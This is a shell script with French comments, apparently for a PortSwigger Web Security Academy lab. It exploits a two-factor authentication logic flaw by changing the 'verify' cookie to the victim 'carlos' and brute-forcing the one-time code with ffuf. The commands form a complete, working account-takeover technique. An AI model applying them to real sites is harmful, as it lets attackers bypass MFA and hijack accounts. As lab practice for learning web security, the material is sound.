# Vérification de la disponibilité du laboratoire
export LAB_URL="https://0a7e007503211c0c81b0a85b005f00ab.web-security-academy.net"
curl -sk -o /dev/null -w "Status: %{http_code}\nURL: %{url_effective}\n" "$LAB_URL"

# Export des infos de connexion
export WIENER_USER="wiener"
export WIENER_PASS="peter"
export TARGET_USER="carlos"
export SESSION_INITIALE="HUVZvWKfLfj44q5b6iGCbeZepRUqhZs8"

# Récupération du token CSRF
curl -sk "$LAB_URL/login" \
    -H "Cookie: session=$SESSION" \
    -c /tmp/cookies.txt \
    -d "username=wiener&password=peter" \
    -D /tmp/headers_login.txt \
    -o /tmp/login_response.html

cat /tmp/headers_login.txt

# Récupération du token CSRF depuis la réponse HTML
export SESSION_USER="k5rVzLaAtWr5bxQ0t5tq3PfZ3x6Uk5ni"
export SESSION_VICTIM="nQgYd3aAV0LAsMbK2agJwKdKaKUKPZKj"

# Force la génération d'un OTP pour carlos
curl -sk "$LAB_URL/login2" \
    -H "Cookie: session=$SESSION_VICTIM; verify=$TARGET_USER" \
    -D /tmp/headers_login2.txt \
    -o /tmp/login2.html

cat /tmp/headers_login2.txt

# Debug de vérification
curl -vk "$LAB_URL/login2" \
    -H "Cookie: session=$SESSION_VICTIM; verify=carlos" 2>&1

# Calibration d'une mauvaise OTP pour carlos
curl -sk -o /dev/null -w "%{size_download}\n" \
    -X POST "$LAB_URL/login2" \
    -H "Cookie: session=$SESSION_VICTIM; verify=carlos" \
    -d "mfa-code=0000"

# Boucle de brute force pour trouver le bon OTP
ffuf \
    -u "$LAB_URL/login2" \
    -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: session=$SESSION_VICTIM; verify=carlos" \
    -d "mfa-code=FUZZ" \
    -w ./tmp/otp.txt \
    -fs 3184 \
    -t 10